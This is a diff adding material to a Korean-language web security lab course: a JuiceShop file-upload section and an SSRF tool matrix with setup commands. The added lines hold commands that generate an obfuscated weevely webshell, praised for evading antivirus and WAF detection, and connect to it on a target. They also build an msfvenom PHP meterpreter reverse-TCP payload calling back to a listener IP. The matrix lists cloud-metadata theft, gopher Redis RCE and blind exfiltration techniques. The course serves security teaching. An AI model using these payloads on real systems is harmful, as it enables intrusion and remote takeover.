@@ -91,6 +91,28 @@
 
 ### 1.3 JuiceShop 파일 업로드 테스트
 
+> **OSS 도구 — weevely (PHP webshell) / fuxploider (file upload scanner)**: curl 수동 업로드는 학습용. 실제 점검은:
+>
+> ```bash
+> # weevely — PHP webshell 생성/접속 표준
+> sudo apt install weevely
+> weevely generate Pa$$w0rd /tmp/shell.php           # webshell 생성 (난독화됨)
+> # /tmp/shell.php 를 업로드 후
+> weevely http://target/uploads/shell.php Pa$$w0rd   # 인터랙티브 shell
+>
+> # fuxploider — 파일 업로드 취약점 자동 fuzzer
+> git clone https://github.com/almandin/fuxploider.git ~/fuxploider
+> cd ~/fuxploider && pip3 install -r requirements.txt
+> python3 fuxploider.py --url http://10.20.30.80:3000/file-upload --not-regex "error"
+>
+> # msfvenom — 다양한 webshell payload (대안)
+> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f raw -o /tmp/php_meter.php
+> ```
+>
+> weevely 의 강점: PHP 코드가 base64 + eval 로 난독화되어 AV/WAF 탐지 회피, 인터랙티브 shell + 파일 매니저 + DB 클라이언트 등 풍부한 기능. fuxploider 는 모든 우회 기법 (이중 확장자/MIME/null byte 등) 자동 시도.
+
+
+
 > **실습 목적**: 파일 업로드, 경로 순회, 명령어 주입 취약점을 점검한다
 >
 > **배우는 것**: 파일 확장자/MIME 검증 우회, ../ 경로 조작, OS 명령어 삽입 기법을 이해하고 점검한다
@@ -543,3 +565,37 @@ ORG-1657 ::: {
 2. dataset 의 4663:4656 비율 (98:79,311 = 0.12%) 을 *baseline* 으로 — 점검 환경에서 0.12% 이상이면 *이상 access*
 3. 4690 (handle duplicate) 가 *web user* (IIS·Apache 실행 계정) 에서 발생 → web 프로세스 권한 escalation 시도 의심
 
+
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (lab week07 — SSRF)
+
+| step | 카테고리 | 핵심 도구 |
+|---|---|---|
+| 1 식별 | 6 위치 표 / curl PUT / **SSRFmap** / **Burp Collaborator** OOB / **interactsh** / nuclei -tags ssrf |
+| 2 포트 스캔 | curl 응답 시간 차이 / SSRFmap portscan / wfuzz range / Burp Intruder / 내부 서비스 포트 표 |
+| 3 localhost | **13 표현 변형** / SSRFmap / interactsh OOB / 우회 효과 표 / DNS resolver 검증 |
+| 4 클라우드 메타데이터 | **7 클라우드 endpoint 표** / curl AWS IMDS / SSRFmap aws / aws CLI 활용 / **IMDSv2 PUT 우회** |
+| 5 프로토콜 스키마 | 8 스키마 표 / file:// 파일 / **gopher:// Redis RCE** / dict:// 정보 누출 / **gopherus** |
+| 6 DNS rebinding | 4 단계 원리 / **rbndr.us** / **Singularity of Origin** / 수동 DNS Python / DNSChef MITM |
+| 7 redirect | Python http.server / Flask chain / SSRFmap redirect / interactsh / 5 redirect 형식 |
+| 8 URL parser | 8 페이로드 / curl 다중 / **Python vs Java vs Node parser 차이** / **ssrf-king Burp** / Orange Tsai |
+| 9 IP 변환 | **12 IP 변형 표** / Python 자동 변환 / curl 모든 변형 / SSRFmap / ipaddress 검증 |
+| 10 내부 API | 8 내부 API 표 (K8s/Consul/etcd/Vault/Docker/Spring/Eureka/Jenkins) / gopherus Redis / **Pacu AWS** / kubectl |
+| 11 체인 | **Capital One 시나리오** / Pacu AWS 자동 / 4 체인 표 / BloodHound AD / **CloudGoat** 학습 환경 |
+| 12 Blind SSRF | **interactsh OOB** / Burp Collaborator / DNS exfil / timing 차이 / SSRFmap blind / **webhook.site** |
+| 13 defense | 5층 방어 / **Python safe_fetch** / Node ssrf-req-filter / Java URLValidator / iptables egress |
+| 14 격리 | iptables/nftables / **K8s NetworkPolicy** / AWS SG + IMDSv2 / **Squid egress proxy** / **Cilium L7** |
+| 15 verification | 자동 보고서 / 위험도 표 / 5층 권고 / sha256 |
+
+### 학생 환경 준비
+```bash
+git clone --depth 1 https://github.com/swisskyrepo/SSRFmap ~/SSRFmap
+git clone --depth 1 https://github.com/tarunkant/Gopherus ~/Gopherus
+git clone --depth 1 https://github.com/nccgroup/singularity ~/singularity
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+pip install dnschef pacu corscanner
+sudo apt install -y squid
+# CloudGoat: git clone https://github.com/RhinoSecurityLabs/cloudgoat
+```
